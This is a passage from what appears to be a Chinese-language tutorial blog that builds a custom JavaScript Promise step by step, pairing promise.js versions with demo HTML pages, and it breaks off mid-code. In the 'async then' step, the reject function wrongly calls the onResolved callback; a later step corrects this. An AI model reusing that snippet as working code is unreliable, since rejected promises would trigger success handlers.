id="throw抛出错误改变状态"><a href="#throw抛出错误改变状态" class="headerlink" title="throw抛出错误改变状态"></a>throw抛出错误改变状态</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**** promise.js文件 *****/</span></span><br><span class="line"><span class="comment">//声明构造函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Promise</span>(<span class="params">executor</span>)&#123;</span><br><span class="line">    <span class="comment">//添加属性</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">PromiseState</span> = <span class="string">&#x27;pending&#x27;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">PromiseResult</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">//保存实例对象的 this 的值</span></span><br><span class="line">    <span class="keyword">const</span> self = <span class="variable language_">this</span>;<span class="comment">// self _this that</span></span><br><span class="line">    <span class="comment">//resolve 函数</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">resolve</span>(<span class="params">data</span>)&#123;</span><br><span class="line">        <span class="comment">//1. 修改对象的状态 (promiseState)</span></span><br><span class="line">        self.<span class="property">PromiseState</span> = <span class="string">&#x27;fulfilled&#x27;</span>;<span class="comment">// resolved</span></span><br><span class="line">        <span class="comment">//2. 设置对象结果值 (promiseResult)</span></span><br><span class="line">        self.<span class="property">PromiseResult</span> = data;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//reject 函数</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">reject</span>(<span class="params">data</span>)&#123;</span><br><span class="line">        <span class="comment">//1. 修改对象的状态 (promiseState)</span></span><br><span class="line">        self.<span class="property">PromiseState</span> = <span class="string">&#x27;rejected&#x27;</span>;<span class="comment">// </span></span><br><span class="line">        <span class="comment">//2. 设置对象结果值 (promiseResult)</span></span><br><span class="line">        self.<span class="property">PromiseResult</span> = data;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="comment">//同步调用『执行器函数』</span></span><br><span class="line">        <span class="title function_">executor</span>(resolve, reject);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="comment">//修改 promise 对象状态为『失败』</span></span><br><span class="line">        <span class="title function_">reject</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加 then 方法</span></span><br><span class="line"><span class="title class_">Promise</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">then</span> = <span class="keyword">function</span>(<span class="params">onResolved, onRejected</span>)&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Promise-封装 | 4 - throw 抛出异常改变状态 <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;script src=&quot;./promise.js&quot;&gt;&lt;/script&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//抛出异常</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">throw</span> <span class="string">&quot;error&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(p);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="状态只能修改一次"><a href="#状态只能修改一次" class="headerlink" title="状态只能修改一次"></a>状态只能修改一次</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**** promise.js文件 *****/</span></span><br><span class="line"><span class="comment">//声明构造函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Promise</span>(<span class="params">executor</span>)&#123;</span><br><span class="line">    <span class="comment">//添加属性</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">PromiseState</span> = <span class="string">&#x27;pending&#x27;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">PromiseResult</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">//保存实例对象的 this 的值</span></span><br><span class="line">    <span class="keyword">const</span> self = <span class="variable language_">this</span>;<span class="comment">// self _this that</span></span><br><span class="line">    <span class="comment">//resolve 函数</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">resolve</span>(<span class="params">data</span>)&#123;</span><br><span class="line">        <span class="comment">//判断状态</span></span><br><span class="line">        <span class="keyword">if</span>(self.<span class="property">PromiseState</span> !== <span class="string">&#x27;pending&#x27;</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//1. 修改对象的状态 (promiseState)</span></span><br><span class="line">        self.<span class="property">PromiseState</span> = <span class="string">&#x27;fulfilled&#x27;</span>;<span class="comment">// resolved</span></span><br><span class="line">        <span class="comment">//2. 设置对象结果值 (promiseResult)</span></span><br><span class="line">        self.<span class="property">PromiseResult</span> = data;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//reject 函数</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">reject</span>(<span class="params">data</span>)&#123;</span><br><span class="line">        <span class="comment">//判断状态</span></span><br><span class="line">        <span class="keyword">if</span>(self.<span class="property">PromiseState</span> !== <span class="string">&#x27;pending&#x27;</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//1. 修改对象的状态 (promiseState)</span></span><br><span class="line">        self.<span class="property">PromiseState</span> = <span class="string">&#x27;rejected&#x27;</span>;<span class="comment">// </span></span><br><span class="line">        <span class="comment">//2. 设置对象结果值 (promiseResult)</span></span><br><span class="line">        self.<span class="property">PromiseResult</span> = data;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="comment">//同步调用『执行器函数』</span></span><br><span class="line">        <span class="title function_">executor</span>(resolve, reject);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="comment">//修改 promise 对象状态为『失败』</span></span><br><span class="line">        <span class="title function_">reject</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加 then 方法</span></span><br><span class="line"><span class="title class_">Promise</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">then</span> = <span class="keyword">function</span>(<span class="params">onResolved, onRejected</span>)&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Promise-封装 | 5 - 状态只能修改一次 <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./promise.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">reject</span>(<span class="string">&quot;error&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">resolve</span>(<span class="string">&#x27;OK&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//抛出异常</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// throw &quot;error&quot;;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(p);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="then方法执行回调"><a href="#then方法执行回调" class="headerlink" title="then方法执行回调"></a>then方法执行回调</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**** promise.js文件 *****/</span></span><br><span class="line"><span class="comment">//声明构造函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Promise</span>(<span class="params">executor</span>)&#123;</span><br><span class="line">    <span class="comment">//添加属性</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">PromiseState</span> = <span class="string">&#x27;pending&#x27;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">PromiseResult</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">//保存实例对象的 this 的值</span></span><br><span class="line">    <span class="keyword">const</span> self = <span class="variable language_">this</span>;<span class="comment">// self _this that</span></span><br><span class="line">    <span class="comment">//resolve 函数</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">resolve</span>(<span class="params">data</span>)&#123;</span><br><span class="line">        <span class="comment">//判断状态</span></span><br><span class="line">        <span class="keyword">if</span>(self.<span class="property">PromiseState</span> !== <span class="string">&#x27;pending&#x27;</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//1. 修改对象的状态 (promiseState)</span></span><br><span class="line">        self.<span class="property">PromiseState</span> = <span class="string">&#x27;fulfilled&#x27;</span>;<span class="comment">// resolved</span></span><br><span class="line">        <span class="comment">//2. 设置对象结果值 (promiseResult)</span></span><br><span class="line">        self.<span class="property">PromiseResult</span> = data;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//reject 函数</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">reject</span>(<span class="params">data</span>)&#123;</span><br><span class="line">        <span class="comment">//判断状态</span></span><br><span class="line">        <span class="keyword">if</span>(self.<span class="property">PromiseState</span> !== <span class="string">&#x27;pending&#x27;</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//1. 修改对象的状态 (promiseState)</span></span><br><span class="line">        self.<span class="property">PromiseState</span> = <span class="string">&#x27;rejected&#x27;</span>;<span class="comment">// </span></span><br><span class="line">        <span class="comment">//2. 设置对象结果值 (promiseResult)</span></span><br><span class="line">        self.<span class="property">PromiseResult</span> = data;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="comment">//同步调用『执行器函数』</span></span><br><span class="line">        <span class="title function_">executor</span>(resolve, reject);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="comment">//修改 promise 对象状态为『失败』</span></span><br><span class="line">        <span class="title function_">reject</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加 then 方法</span></span><br><span class="line"><span class="title class_">Promise</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">then</span> = <span class="keyword">function</span>(<span class="params">onResolved, onRejected</span>)&#123;</span><br><span class="line">    <span class="comment">//调用回调函数  PromiseState</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">PromiseState</span> === <span class="string">&#x27;fulfilled&#x27;</span>)&#123;</span><br><span class="line">        <span class="title function_">onResolved</span>(<span class="variable language_">this</span>.<span class="property">PromiseResult</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">PromiseState</span> === <span class="string">&#x27;rejected&#x27;</span>)&#123;</span><br><span class="line">        <span class="title function_">onRejected</span>(<span class="variable language_">this</span>.<span class="property">PromiseResult</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Promise-封装 | 6 - then 方法执行回调 <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./promise.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//实例化对象</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// resolve(&#x27;OK&#x27;);</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// reject(&quot;Error&quot;);</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">throw</span> <span class="string">&quot;ERROR&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    p.<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(value);</span></span><br><span class="line"><span class="language-javascript">    &#125;, <span class="function"><span class="params">reason</span>=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">warn</span>(reason);</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="异步任务then方法执行回调"><a href="#异步任务then方法执行回调" class="headerlink" title="异步任务then方法执行回调"></a>异步任务then方法执行回调</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**** promise.js文件 *****/</span></span><br><span class="line"><span class="comment">//声明构造函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Promise</span>(<span class="params">executor</span>)&#123;</span><br><span class="line">    <span class="comment">//添加属性</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">PromiseState</span> = <span class="string">&#x27;pending&#x27;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">PromiseResult</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">//声明属性</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">callback</span> = &#123;&#125;;</span><br><span class="line">    <span class="comment">//保存实例对象的 this 的值</span></span><br><span class="line">    <span class="keyword">const</span> self = <span class="variable language_">this</span>;<span class="comment">// self _this that</span></span><br><span class="line">    <span class="comment">//resolve 函数</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">resolve</span>(<span class="params">data</span>)&#123;</span><br><span class="line">        <span class="comment">//判断状态</span></span><br><span class="line">        <span class="keyword">if</span>(self.<span class="property">PromiseState</span> !== <span class="string">&#x27;pending&#x27;</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//1. 修改对象的状态 (promiseState)</span></span><br><span class="line">        self.<span class="property">PromiseState</span> = <span class="string">&#x27;fulfilled&#x27;</span>;<span class="comment">// resolved</span></span><br><span class="line">        <span class="comment">//2. 设置对象结果值 (promiseResult)</span></span><br><span class="line">        self.<span class="property">PromiseResult</span> = data;</span><br><span class="line">        <span class="comment">//调用成功的回调函数</span></span><br><span class="line">        <span class="keyword">if</span>(self.<span class="property">callback</span>.<span class="property">onResolved</span>)&#123;</span><br><span class="line">            self.<span class="property">callback</span>.<span class="title function_">onResolved</span>(data);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//reject 函数</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">reject</span>(<span class="params">data</span>)&#123;</span><br><span class="line">        <span class="comment">//判断状态</span></span><br><span class="line">        <span class="keyword">if</span>(self.<span class="property">PromiseState</span> !== <span class="string">&#x27;pending&#x27;</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//1. 修改对象的状态 (promiseState)</span></span><br><span class="line">        self.<span class="property">PromiseState</span> = <span class="string">&#x27;rejected&#x27;</span>;<span class="comment">// </span></span><br><span class="line">        <span class="comment">//2. 设置对象结果值 (promiseResult)</span></span><br><span class="line">        self.<span class="property">PromiseResult</span> = data;</span><br><span class="line">        <span class="comment">//执行回调</span></span><br><span class="line">        <span class="keyword">if</span>(self.<span class="property">callback</span>.<span class="property">onResolved</span>)&#123;</span><br><span class="line">            self.<span class="property">callback</span>.<span class="title function_">onResolved</span>(data);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="comment">//同步调用『执行器函数』</span></span><br><span class="line">        <span class="title function_">executor</span>(resolve, reject);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="comment">//修改 promise 对象状态为『失败』</span></span><br><span class="line">        <span class="title function_">reject</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加 then 方法</span></span><br><span class="line"><span class="title class_">Promise</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">then</span> = <span class="keyword">function</span>(<span class="params">onResolved, onRejected</span>)&#123;</span><br><span class="line">    <span class="comment">//调用回调函数  PromiseState</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">PromiseState</span> === <span class="string">&#x27;fulfilled&#x27;</span>)&#123;</span><br><span class="line">        <span class="title function_">onResolved</span>(<span class="variable language_">this</span>.<span class="property">PromiseResult</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">PromiseState</span> === <span class="string">&#x27;rejected&#x27;</span>)&#123;</span><br><span class="line">        <span class="title function_">onRejected</span>(<span class="variable language_">this</span>.<span class="property">PromiseResult</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//判断 pending 状态，异步操作状态不确定，需保存回调函数</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">PromiseState</span> === <span class="string">&#x27;pending&#x27;</span>)&#123;</span><br><span class="line">        <span class="comment">//保存回调函数</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">callback</span> = &#123;</span><br><span class="line">            <span class="attr">onResolved</span>: onResolved,</span><br><span class="line">            <span class="attr">onRejected</span>: onRejected</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Promise-封装 | 7 - 异步任务 then 方法实现 <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;./promise.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//实例化对象</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// resolve(&#x27;OK&#x27;);</span></span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">reject</span>(<span class="string">&quot;error&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;, <span class="number">1000</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    p.<span class="title function_">then</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(value);</span></span><br><span class="line"><span class="language-javascript">    &#125;, <span class="function"><span class="params">reason</span>=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">warn</span>(reason);</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(p);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="指定多个回调"><a href="#指定多个回调" class="headerlink" title="指定多个回调"></a>指定多个回调</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**** promise.js文件 *****/</span></span><br><span class="line"><span class="comment">//声明构造函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Promise</span>(<span class="params">executor</span>)&#123;</span><br><span class="line">    <span class="comment">//添加属性</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">PromiseState</span> = <span class="string">&#x27;pending&#x27;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">PromiseResult</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">//声明属性</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">callbacks</span> = [];</span><br><span class="line">    <span class="comment">//保存实例对象的 this 的值</span></span><br><span class="line">    <span class="keyword">const</span> self = <span class="variable language_">this</span>;<span class="comment">// self _this that</span></span><br><span class="line">    <span class="comment">//resolve 函数</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">resolve</span>(<span class="params">data</span>)&#123;</span><br><span class="line">        <span class="comment">//判断状态</span></span><br><span class="line">        <span class="keyword">if</span>(self.<span class="property">PromiseState</span> !== <span class="string">&#x27;pending&#x27;</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//1. 修改对象的状态 (promiseState)</span></span><br><span class="line">        self.<span class="property">PromiseState</span> = <span class="string">&#x27;fulfilled&#x27;</span>;<span class="comment">// resolved</span></span><br><span class="line">        <span class="comment">//2. 设置对象结果值 (promiseResult)</span></span><br><span class="line">        self.<span class="property">PromiseResult</span> = data;</span><br><span class="line">        <span class="comment">//调用成功的回调函数</span></span><br><span class="line">        self.<span class="property">callbacks</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">            item.<span class="title function_">onResolved</span>(data);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//reject 函数</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">reject</span>(<span class="params">data</span>)&#123;</span><br><span class="line">        <span class="comment">//判断状态</span></span><br><span class="line">        <span class="keyword">if</span>(self.<span class="property">PromiseState</span> !== <span class="string">&#x27;pending&#x27;</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//1. 修改对象的状态 (promiseState)</span></span><br><span class="line">        self.<span class="property">PromiseState</span> = <span class="string">&#x27;rejected&#x27;</span>;<span class="comment">// </span></span><br><span class="line">        <span class="comment">//2. 设置对象结果值 (promiseResult)</span></span><br><span class="line">        self.<span class="property">PromiseResult</span> = data;</span><br><span class="line">        <span class="comment">//执行失败的回调</span></span><br><span class="line">        self.<span class="property">callbacks</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">            item.<span class="title function_">onRejected</span>(data);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="comment">//同步调用『执行器函数』</span></span><br><span class="line">        <span class="title function_">executor</span>(resolve, reject);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="comment">//修改 promise 对象状态为『失败』</span></span><br><span class="line">        <span class="title function_">reject</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加 then 方法</span></span><br><span class="line"><span class="title class_">Promise</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">then</span> = <span class="keyword">function</span>(<span class="params">onResolved, onRejected</span>)&#123;</span><br><span class="line">    <span class="comment">//调用回调函数  PromiseState</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">PromiseState</span> === <span class="string">&#x27;fulfilled&#x27;</span>)&#123;</span><br><span class="line">        <span class="title function_">onResolved</span>(<span class="variable language_">this</span>.<span class="property">PromiseResult</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">PromiseState</span> === <span class="string">&#x27;rejected&#x27;</span>)&#123;</span><br><span class="line">        <span class="title function_">onRejected</span>(<span class="variable language_">this</span>.<span class="property">PromiseResult</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//判断 pending 状态</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">PromiseState</span> === <span class="string">&#x27;pending&#x27;</span>)&#123;</span><br><span class="line">        <span class="comment">//保存回调函数</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">callbacks</span>.<span class="title function_">push</span>(&#123;</span><br><span class="line">            <span class="attr">onResolved</span>: onResolved,</span><br><span class="line">            <span class="attr">onRejected</span>: onRejected</span><br><span class="line">        